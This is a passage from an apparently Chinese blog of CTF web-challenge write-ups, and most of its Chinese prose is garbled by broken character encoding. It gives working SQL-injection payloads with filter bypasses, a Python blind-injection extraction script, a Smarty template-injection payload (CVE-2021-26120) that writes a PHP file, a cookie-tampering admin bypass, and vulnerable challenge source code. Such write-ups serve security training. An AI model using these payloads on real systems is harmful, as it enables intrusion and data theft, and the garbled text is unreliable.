class="line">1&#x27;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410170529355.png" alt="image-20230410170529355"></p><p>å‘ç°23ä½ç½®æœ‰å›æ˜¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åˆ©ç”¨è¿™ä¸¤ä¸ªä½ç½®æ¥è¿›è¡ŒæŸ¥è¯¢</p><p><strong>æŸ¥æ•°æ®åº“</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&#x27;union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410171102690.png" alt="image-20230410171102690"></p><p>æŸ¥å‡ºæ•°æ®åº“åï¼Œå› ä¸ºorè¢«è¿‡æ»¤äº†</p><p>æŸ¥è¡¨åï¼Œå› ä¸ºè¿™é‡Œè¿‡æ»¤<code>or</code>æ‰€ä»¥ä¹Ÿæ— æ³•ä½¿ç”¨<code>information_schema</code>è¡¨ï¼Œä¹Ÿæ²¡æœ‰<code>sys</code>è¡¨ï¼Œæ‰€ä»¥ä½¿ç”¨<code>mysql.innodb_table_stats</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&#x27;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22&amp;content=mochu7&amp;ac=add</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410171219143.png" alt="image-20230410171219143"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8ã€è¿›è¡ŒåŒ¿åè·å–flagå€¼ï¼Œpayloadï¼š1&#x27;/**/union/**/select/**/1,(select/**/group_concat(c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1ï¼Œæˆ–è€…payloadï¼š1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1ï¼Œå…¶ä¸­group_concat(å‚æ•°)ï¼Œå¯¹å‚æ•°è¿›è¡Œä¿®æ”¹ï¼Œè®¿é—®æ¯ä¸€ä¸ªå­—æ®µï¼Œç»“æœå¦‚ä¸‹ï¼š</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªå°çŸ¥è¯†ç‚¹å°±æ˜¯group_concat(`3`)é‡Œçš„3å’Œå¤–é¢æŸ¥è¯¢çš„åˆ«åæ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯</p><p>3å¿…é¡»æ˜¯è¡¨é‡Œå¿…é¡»æœ‰ä¸‰åˆ—ï¼Œç„¶åå¿…é¡»æ—©select 1ï¼Œ2ï¼Œ3xxxè¿™é‡Œè¿›è¡ŒæŸ¥è¯¢</p><p><img src="../images/image-20230410173317416.png" alt="image-20230410173317416"></p><p>æœ¬åœ°ä¹Ÿè¿›è¡Œæµ‹è¯•è¿‡äº†</p><p><img src="../images/image-20230410173337170.png" alt="image-20230410173337170"></p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230410173453240.png" alt="image-20230410173453240"></p><p><img src="../images/image-20230410174811347.png" alt="image-20230410174811347"></p><p>é¢˜ç›®ä¸­ä¹Ÿæœ‰XFFï¼Œç„¶åè¯·æ±‚å¤´ä¸­å¹¶æ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•æŠ“åŒ…çœ‹çœ‹</p><p>å‘ç°æ²¡æœ‰ï¼Œç„¶åæ·»åŠ æŸ¥çœ‹ï¼Œå‘ç°è¿™é‡Œå¯ä»¥è¿›è¡Œå›æ˜¾</p><p><img src="../images/image-20230410175020518.png" alt="image-20230410175020518"></p><p>è¿™é‡Œå’Œä¹‹å‰çš„ä¸€é“é¢˜å¾ˆåƒï¼Œå°±æ˜¯åˆ©ç”¨è¿™é‡Œæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯ä¹‹å‰çš„é¢˜æ˜¯sstiçš„ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªæ¨¡æ¿çš„rce</p><p>æ‰€ä»¥æˆ‘ä»¬å°±çŒœæµ‹è¿™é‡Œä¼šä¸ä¼šä¹Ÿæ˜¯è€ƒæ¨¡æ¿çš„ssti</p><p><img src="../images/image-20230410175234890.png" alt="image-20230410175234890"></p><p>å¯¹è¿™ä¸ªç©æ„çœ¼ç†Ÿå§</p><p><img src="../images/image-20230410175258323.png" alt="image-20230410175258323"></p><p>äºæ˜¯å°±å»æ‰¾è¿™ä¸ªæ¨¡æ¿çš„rce</p><p><a href="https://www.venustech.com.cn/new_type/aqtg/20210226/22409.html">æ–‡ç« wp</a></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;</span><br></pre></td></tr></table></figure><p>å¾—æ‰§è¡Œä¸¤æ¬¡æ‰è¡Œ</p><p><img src="../images/image-20230410175551036.png" alt="image-20230410175551036"></p><p><img src="../images/image-20230410175712890.png" alt="image-20230410175712890"></p><p>è¿˜æ˜¯ç‚¹ä¸¤æ¬¡å‘é€å°±è¡Œ</p><p><img src="../images/image-20230410175728695.png" alt="image-20230410175728695"></p><p><strong>CVE-2021-26120</strong></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230410194457013.png" alt="image-20230410194457013"></p><p>è¿™é‡Œè¿›è¡Œäº†ç®€å•çš„æç¤º</p><p>å°±æ˜¯è€ƒå¯Ÿçš„æ˜¯sqlç›²æ³¨</p><p>æç¤ºå¾ˆæ˜æ˜¾ï¼Œéœ€è¦SQLç›²æ³¨<br>è¿™é“é¢˜çš„æ³¨å…¥ç‚¹ä¸æ˜¯ç™»å½•æ¡†ï¼Œè€Œæ˜¯ä¸Šé¢çš„æ•°å­—æŒ‰é’®<br>åœ¨ç™»å½•æ¡†æµ‹è¯•èƒ½å¦æ³¨å…¥çš„æ—¶å€™ï¼Œè¿”å›å€¼æ²¡æœ‰æ˜¾ç¤ºé”™è¯¯</p><p><img src="../images/image-20230410194738135.png" alt="image-20230410194738135"></p><p>æ³¨å…¥ç‚¹åœ¨ä¸Šé¢çš„æ•°å­—å¤„ï¼Œé‚£é‡Œæ‰æ˜¯æ³¨å…¥ç‚¹</p><p><img src="../images/image-20230410194911976.png" alt="image-20230410194911976"></p><p><strong>paylaod</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://e4247cff-5d64-4353-b875-e07e478c50bf.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># ä¸­é—´çš„è¯­å¥ä¸ºçœŸï¼Œç½‘é¡µä¸æŠ¥é”™ï¼Œä¸­é—´çš„è¯­å¥ä¸ºå‡ï¼Œç½‘é¡µæŠ¥é”™ï¼Œæ ¹æ®è¿™ä¸ªåˆ¤æ–­</span></span><br><span class="line">        <span class="comment"># æŸ¥æ•°æ®åº“</span></span><br><span class="line">        database = <span class="string">&quot;?id=1^(ord(substr((select(database())),%d,1))&gt;%d)^1&quot;</span> % (i, mid)</span><br><span class="line">        <span class="comment"># æŸ¥è¡¨</span></span><br><span class="line">        tables = <span class="string">&quot;?id=1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;</span>%(i,j)</span><br><span class="line">        columns = <span class="string">&quot;?id=1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;</span>%(i,j)</span><br><span class="line">        data = <span class="string">&quot;?id=1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> % (i, j)</span><br><span class="line">        <span class="comment"># æ ¹æ®éœ€è¦æŸ¥è¯¢çš„å†…å®¹æ”¹å˜getä¸­çš„å‚æ•°</span></span><br><span class="line">        r = requests.get(url=url+database)</span><br><span class="line">        <span class="comment"># print(url+database)</span></span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        <span class="comment"># print(r.raw)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Click&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="comment"># print(low,mid,high)</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è®°å¾—ä¸çŸ¥é“è¿‡æ»¤å•¥çš„æ—¶å€™è¿›è¡ŒæŠ“åŒ…fuzzæµ‹è¯•ä¸€ä¸‹</p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230410195215842.png" alt="image-20230410195215842"></p><p><img src="../images/image-20230410195245734.png" alt="image-20230410195245734"></p><p>æŸ¥çœ‹æºç å°±è¡Œ</p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>é¢˜ç›®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.xists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                resp = scan(self.param)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line"></span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line"></span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line"></span><br><span class="line">                    tmpfile.close()</span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line"></span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line"></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line"></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) <span class="comment">#urllib.unquote æ˜¯urlè§£ç    ----urlib.urlencode æ˜¯urlç¼–ç   #request.args.getè·å–å•ä¸ªå€¼</span></span><br><span class="line"></span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line"></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line"></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line"></span><br><span class="line">    ip = request.remote_addr <span class="comment">#è·å–requestçš„ip</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line"></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¯é¢˜ç›®å°±æ˜¯è€ƒç‚¹</p><p>è¿™é‡Œçš„ä»£ç æœ‰ç‚¹é•¿ï¼Œå°±å¾—è€ƒå¯Ÿä»£ç å®¡è®¡èƒ½åŠ›äº†</p><p><a href="https://www.cnblogs.com/LEOGG321/p/13406418.html">è¯¦ç»†çš„wp</a>   çœ‹è¿™ä¸ªwpå°±è¡Œäº†ï¼Œè¿™é‡Œå°±ä¸å¤šå†™äº†</p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230410200301423.png" alt="image-20230410200301423"></p><p>è¿™é‡Œè·Ÿæ®é¢˜ç›®åå­—çŒœæµ‹è·Ÿcookieæœ‰å…³</p><p>æŠ“åŒ…è¾“å…¥é¢˜ç›®ç»™çš„è´¦å·å¯†ç </p><p>ç„¶åç™»å½•æˆåŠŸ</p><p><img src="../images/image-20230410200634909.png" alt="image-20230410200634909"></p><p>å‘ç°å†…å®¹ä¸ºusername=cookieçš„é”®å€¼å¯¹ã€‚</p><p>æ˜¾ç„¶è¿™é‡ŒCookieä¸­çš„é”®å€¼å¯¹çš„å€¼ä½œä¸ºäº†æœåŠ¡ç«¯åœ¨ç”¨æˆ·é€šè¿‡è´¦æˆ·å¯†ç ç™»å½•ä¹‹åå†æ¬¡è®¿é—®æ—¶éªŒè¯èº«ä»½çš„å‡­è¯ï¼Œå°†å…¶å€¼æ”¹ä¸ºadminä¹Ÿå°±æ ‡å¿—æˆ‘ä»¬æˆä¸ºäº†adminç”¨æˆ·ï¼Œæ¥ç€å†æºå¸¦ä¿®æ”¹åçš„Cookieè®¿é—®é¡µé¢å°±èƒ½è·å¾—flagã€‚</p><p><img src="../images/image-20230410201052297.png" alt="image-20230410201052297"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230410201152027.png" alt="image-20230410201152027"></p><p>é¢˜ç›®ä¸Šè¦search</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±æ‰«ä¸€ä¸‹ç›®å½•</p><p><strong>æ‰«åå°å‘ç°index.php.swpå¤‡ä»½ã€‚</strong></p><p><img src="../images/image-20230410201336318.png" alt="image-20230410201336318"></p><p><strong>ä¸€æ®µä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span 